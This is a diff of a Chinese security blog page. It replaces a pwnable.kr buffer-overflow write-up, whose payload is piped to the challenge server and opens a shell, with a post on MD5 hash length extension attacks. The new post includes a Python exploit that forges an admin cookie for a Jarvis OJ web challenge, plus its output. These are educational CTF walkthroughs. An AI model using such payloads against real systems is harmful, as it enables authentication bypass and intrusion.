@@ -117,25 +117,25 @@
   daovoice('update');
   </script>
 
-  <meta name="description" content="分析查看源码bof.c123456789101112131415161718#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key)&amp;#123;	char overflowme[32];	printf(&quot;overflow me : &quot;);	gets(overflowme)">
-<meta name="keywords" content="pwnable.kr,PWN">
+  <meta name="description" content="简介hash长度扩展攻击主要指对类似MD5算法的hash算法攻击。当一个程序有类似if(input1 == md5(salt+input2)){}的逻辑并且能获得一次md5(salt+input2)的hash值的时候，n那么这个程序就容易受到hash长度扩展攻击。 分析原理这种针对哈希算法的攻击当然与算法有关。这里通过MD5算法来分析这种攻击方式。 MD5算法MD5是一种消息摘要算法，它的计算过程">
+<meta name="keywords" content="密码学">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.kr-bof">
-<meta property="og:url" content="https://r00tnb.github.io/2017/12/08/pwnable.kr-bof/index.html">
+<meta property="og:title" content="hash长度扩展攻击">
+<meta property="og:url" content="https://r00tnb.github.io/2018/08/13/hash长度扩展攻击/index.html">
 <meta property="og:site_name" content="R00tnb&#39;s Blog">
-<meta property="og:description" content="分析查看源码bof.c123456789101112131415161718#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key)&amp;#123;	char overflowme[32];	printf(&quot;overflow me : &quot;);	gets(overflowme)">
+<meta property="og:description" content="简介hash长度扩展攻击主要指对类似MD5算法的hash算法攻击。当一个程序有类似if(input1 == md5(salt+input2)){}的逻辑并且能获得一次md5(salt+input2)的hash值的时候，n那么这个程序就容易受到hash长度扩展攻击。 分析原理这种针对哈希算法的攻击当然与算法有关。这里通过MD5算法来分析这种攻击方式。 MD5算法MD5是一种消息摘要算法，它的计算过程">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-08-04T14:32:31.066Z">
+<meta property="og:updated_time" content="2018-08-13T12:53:16.389Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr-bof">
-<meta name="twitter:description" content="分析查看源码bof.c123456789101112131415161718#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key)&amp;#123;	char overflowme[32];	printf(&quot;overflow me : &quot;);	gets(overflowme)">
+<meta name="twitter:title" content="hash长度扩展攻击">
+<meta name="twitter:description" content="简介hash长度扩展攻击主要指对类似MD5算法的hash算法攻击。当一个程序有类似if(input1 == md5(salt+input2)){}的逻辑并且能获得一次md5(salt+input2)的hash值的时候，n那么这个程序就容易受到hash长度扩展攻击。 分析原理这种针对哈希算法的攻击当然与算法有关。这里通过MD5算法来分析这种攻击方式。 MD5算法MD5是一种消息摘要算法，它的计算过程">
 
 
 
 
 
 
-  <link rel="canonical" href="https://r00tnb.github.io/2017/12/08/pwnable.kr-bof/"/>
+  <link rel="canonical" href="https://r00tnb.github.io/2018/08/13/hash长度扩展攻击/"/>
 
 
 
@@ -145,7 +145,7 @@
   };
 </script>
 
-  <title>pwnable.kr-bof | R00tnb's Blog</title>
+  <title>hash长度扩展攻击 | R00tnb's Blog</title>
   
 
 
@@ -319,7 +319,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2017/12/08/pwnable.kr-bof/">
+    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/08/13/hash长度扩展攻击/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="r00tnb">
@@ -336,7 +336,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">pwnable.kr-bof
+          <h1 class="post-title" itemprop="name headline">hash长度扩展攻击
               
             
           </h1>
@@ -361,24 +361,12 @@
                 
               
 
-              <time title="创建时间：2017-12-08 16:43:00" itemprop="dateCreated datePublished" datetime="2017-12-08T16:43:00+08:00">2017-12-08</time>
+              <time title="创建时间：2018-08-13 19:29:04 / 修改时间：20:53:16" itemprop="dateCreated datePublished" datetime="2018-08-13T19:29:04+08:00">2018-08-13</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
               
             
           </span>
@@ -395,7 +383,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/密码安全/" itemprop="url" rel="index"><span itemprop="name">密码安全</span></a></span>
 
                 
                 
@@ -410,8 +398,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/12/08/pwnable.kr-bof/#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2017/12/08/pwnable.kr-bof/" itemprop="commentCount"></span>
+                <a href="/2018/08/13/hash长度扩展攻击/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/08/13/hash长度扩展攻击/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -447,10 +435,19 @@
       
 
       
-        <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查看源码<code>bof.c</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>func函数中如果传入参数为<code>0xcafebabe</code>则会获得一个shell，但是main函数中调用func函数时传入了一个错误的数值，显然这题是要通过栈溢出来覆盖形参key的值。<br>通过ida查看bof程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000062C                 public func</span><br><span class="line">.text:0000062C func            proc near               ; CODE XREF: main+10p</span><br><span class="line">.text:0000062C</span><br><span class="line">.text:0000062C s               = byte ptr -2Ch</span><br><span class="line">.text:0000062C var_C           = dword ptr -0Ch</span><br><span class="line">.text:0000062C arg_0           = dword ptr  8</span><br><span class="line">.text:0000062C</span><br><span class="line">.text:0000062C                 push    ebp</span><br><span class="line">.text:0000062D                 mov     ebp, esp</span><br><span class="line">.text:0000062F                 sub     esp, 48h</span><br><span class="line">.text:00000632                 mov     eax, large gs:14h</span><br><span class="line">.text:00000638                 mov     [ebp+var_C], eax</span><br><span class="line">.text:0000063B                 xor     eax, eax</span><br><span class="line">.text:0000063D                 mov     dword ptr [esp], offset s ; &quot;overflow me : &quot;</span><br><span class="line">.text:00000644                 call    puts</span><br><span class="line">.text:00000649                 lea     eax, [ebp+s]</span><br><span class="line">.text:0000064C                 mov     [esp], eax      ; s</span><br><span class="line">.text:0000064F                 call    gets</span><br></pre></td></tr></table></figure></p>
-<p>上面是func函数的汇编片段，可以看到func函数开辟了48h的栈空间，但是gets函数将输入字符串存放在ebp偏移-2ch的位置，再加上ebp，retaddr的大小一共是34h的偏移，这个34h就是overflow到key的偏移，于是有下面的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c &quot;print &apos;a&apos;*0x34+&apos;\xbe\xba\xfe\xca&apos;&quot;;cat) | nc pwnable.kr 9000</span><br></pre></td></tr></table></figure></p>
-<p>其中加cat维持shell的交互<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/pwn/bof# (python -c &quot;print &apos;a&apos;*0x34+&apos;\xbe\xba\xfe\xca&apos;&quot;;cat) | nc pwnable.kr 9000</span><br><span class="line">ls</span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line">log</span><br><span class="line">log2</span><br><span class="line">super.pl</span><br><span class="line">cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure></p>
+        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>hash长度扩展攻击</code>主要指对类似MD5算法的hash算法攻击。当一个程序有类似<code>if(input1 == md5(salt+input2)){}</code>的逻辑并且能获得一次<code>md5(salt+input2)</code>的hash值的时候，n那么这个程序就容易受到<code>hash长度扩展攻击</code>。</p>
+<h1 id="分析原理"><a href="#分析原理" class="headerlink" title="分析原理"></a>分析原理</h1><p>这种针对哈希算法的攻击当然与算法有关。这里通过MD5算法来分析这种攻击方式。</p>
+<h2 id="MD5算法"><a href="#MD5算法" class="headerlink" title="MD5算法"></a>MD5算法</h2><p>MD5是一种消息摘要算法，它的计算过程不可逆。它主要通过以下步骤来计算最后的hash值：</p>
+<ol>
+<li>填充。计算传入的消息文本<code>text</code>的长度（单位：bits），看它除以512的余数是否为448。等于则将填充前的长度（单位：bits）填充到消息文本的末端（占64bits）。否则，填充二进制1到消息文本末端，之后填充二进制0直到最后消息的长度除以512的余数为448，再将填充前的长度（单位：bits）填充到消息文本的末端（占64bits）。</li>
+<li>分组。由于第一步的填充消息的长度必为512的整数倍，将填充完毕的消息按每组512bits分组。</li>
+<li>分组计算。将<code>A=0x67452301,B=0xefcdab89,C=0x98badcfe,D=0x10325476</code>作为第一组的链变量，并且每一组进行64步轮换计算，每组计算完成后得到<code>a,b,c,d</code>四个32位的整数，将这四个整数分别加上该组的链变量作为下一组的链变量使用。当所有组计算完毕，得到最后的链变量。将链变量级联起来作为最后的结果。<br>这些就是MD5算法的计算步骤，关于<code>轮换计算</code>的算法有点复杂就不写了，网上有。<h2 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h2>分析MD5算法的第三步可以发现，每组消息的计算结果取决于该组的链变量和该组的消息内容，如果知道了最后一组的链变量和消息内容那么不需要知道前面几组到底是什么就可以计算出最后的消息摘要。这对于类似有<code>if(input1 == md5(salt+input2)){}</code>代码逻辑的程序来说是可能绕过盐值而达到判断成立的。因为，我们可以通过在原消息的基础上，扩展一个消息分组出来，然后利用最后一个扩展的消息分组的内容可控性，和原消息的hash值（这能计算出最后一个分组的链变量）来重演最后一个分组的计算过程，进而得到最后的hash值。<h1 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h1>下面举一个例子来说明<code>hash长度扩展攻击</code>的利用场景。<br>这是一道<code>jarvis oj</code>平台上的CTF题目<code>flag在管理员手里</code>，在web板块。<br>题目可以读取备份文件<code>index.php~</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web <span class="number">350</span>&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">	body &#123;</span><br><span class="line">		background:gray;</span><br><span class="line">		text-align:center;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span> </span><br><span class="line">		$auth = <span class="keyword">false</span>;</span><br><span class="line">		$role = <span class="string">"guest"</span>;</span><br><span class="line">		$salt = </span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span><br><span class="line">			$role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span><br><span class="line">			$hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">			<span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span><br><span class="line">				$auth = <span class="keyword">true</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$auth = <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$s = serialize($role);</span><br><span class="line">			setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">			$hsh = md5($salt.strrev($s));</span><br><span class="line">			setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">		&#125; else &#123;</span></span><br><span class="line"><span class="string">			echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	?&gt;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>读源码可以发现，只有当<code>$_COOKIE[&quot;role&quot;]</code>的反序列化值为<code>admin</code>并且<code>$hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))</code>成立才能getflag。这和hash长度扩展攻击的利用场景一致，因为我们能够控制最后一个消息分组的内容，而且程序会在<code>$_COOKIE[&quot;role&quot;]</code>未定义的时候把一段hash值返回给我们，这样我们能够通过该hash值反计算到最后一个分组的链变量，即最后一个消息分组的内容和链变量都知道了，那么即使不知道盐值也可计算最后的hash值。<br>需要注意的是，我们传入程序的是两个输入，一个作为消息主体传入另一个作为最后的hash值传入。虽然hash值能准确计算，但是消息主体却是不确定的，因为我们无法得知<code>salt</code>的长度，我们就无法计算前一个消息分组究竟要怎么填充，也就无法得到准确的消息主体了。所以这一题需要爆破<code>salt</code>的长度。下面是exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> myhash <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://web.jarvisoj.com:32778/"</span></span><br><span class="line">tmp_hsh = <span class="string">"3a4727d57463f122833d9e732f94e4e0"</span></span><br><span class="line"><span class="comment">#爆破</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    p = <span class="string">'s:5:"admin";'</span>[::<span class="number">-1</span>]</span><br><span class="line">    poc = <span class="string">'s:5:"guest";'</span></span><br><span class="line">    poc = md5_fill(<span class="string">'x'</span>*i+poc[::<span class="number">-1</span>]).lstrip(<span class="string">'x'</span>*i)+p</span><br><span class="line">    poc = poc[::<span class="number">-1</span>]</span><br><span class="line">    poc = urllib.quote(poc)</span><br><span class="line">    tmp = hash_split(tmp_hsh)</span><br><span class="line">    m = MD5(p,*tmp)</span><br><span class="line">    s = m.md5(<span class="number">512</span>+len(p)*<span class="number">8</span>)</span><br><span class="line">    headers = &#123;<span class="string">"Cookie"</span>:<span class="string">"role=&#123;&#125;;hsh=&#123;&#125;"</span>.format(poc,s)&#125;</span><br><span class="line">    r = requests.get(url,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">"Only Admin"</span>) == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'No.'</span></span><br></pre></td></tr></table></figure></p>
+<p>结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&gt; python poc.py</span><br><span class="line">No.</span><br><span class="line">No.</span><br><span class="line">No.</span><br><span class="line">No.</span><br><span class="line">No.</span><br><span class="line">No.</span><br><span class="line">No.</span><br><span class="line">No.</span><br><span class="line">No.</span><br><span class="line">No.</span><br><span class="line">No.</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 350&lt;/title&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">                background:gray;</span><br><span class="line">                text-align:center;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;h3&gt;Welcome Admin. Your flag is PCTF&#123;H45h_ext3ndeR_i5_easy_to_us3&#125; &lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">12</span><br></pre></td></tr></table></figure></p>
+<p>这里的<code>myhash</code>是我自己写的<code>MD5</code>算法，便于扩展攻击。可以在我的<a href="https://github.com/r00tnb/pylibs" target="_blank" rel="noopener">github</a>上找到。</p>
+<h1 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h1><p>使用<code>md5(salt+hash(input))</code>的方式来使消息主体不可控。</p>
 
       
     </div>
@@ -482,12 +479,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2017/12/08/pwnable.kr-bof/">pwnable.kr-bof</a></p>
+  <p><span>本文标题:</span><a href="/2018/08/13/hash长度扩展攻击/">hash长度扩展攻击</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 r00tnb 的个人博客">r00tnb</a></p>
-  <p><span>发布时间:</span>2017年12月08日 - 16:12</p>
-  <p><span>最后更新:</span>2018年08月04日 - 22:08</p>
-  <p><span>原始链接:</span><a href="/2017/12/08/pwnable.kr-bof/" title="pwnable.kr-bof">https://r00tnb.github.io/2017/12/08/pwnable.kr-bof/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://r00tnb.github.io/2017/12/08/pwnable.kr-bof/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2018年08月13日 - 19:08</p>
+  <p><span>最后更新:</span>2018年08月13日 - 20:08</p>
+  <p><span>原始链接:</span><a href="/2018/08/13/hash长度扩展攻击/" title="hash长度扩展攻击">https://r00tnb.github.io/2018/08/13/hash长度扩展攻击/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://r00tnb.github.io/2018/08/13/hash长度扩展攻击/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -545,9 +542,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/pwnable-kr/" rel="tag"><i class="fa fa-tag"></i> pwnable.kr</a>
-          
-            <a href="/tags/PWN/" rel="tag"><i class="fa fa-tag"></i> PWN</a>
+            <a href="/tags/密码学/" rel="tag"><i class="fa fa-tag"></i> 密码学</a>
           
         </div>
       
@@ -560,8 +555,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/12/08/pwnable.kr-collision/" rel="next" title="pwnable.kr-collision">
-                <i class="fa fa-chevron-left"></i> pwnable.kr-collision
+              <a href="/2018/08/06/pwnable-kr-unexploitable/" rel="next" title="pwnable.kr-unexploitable">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-unexploitable
               </a>
             
           </div>
@@ -569,10 +564,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/12/09/pwnable.kr-flag/" rel="prev" title="pwnable.kr-flag">
-                pwnable.kr-flag <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -755,7 +746,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">1.</span> <span class="nav-text">分析</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析原理"><span class="nav-number">2.</span> <span class="nav-text">分析原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MD5算法"><span class="nav-number">2.1.</span> <span class="nav-text">MD5算法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击分析"><span class="nav-number">2.2.</span> <span class="nav-text">攻击分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#举个例子"><span class="nav-number">3.</span> <span class="nav-text">举个例子</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#预防"><span class="nav-number">4.</span> <span class="nav-text">预防</span></a></li></ol></div>
             
 
           </div>
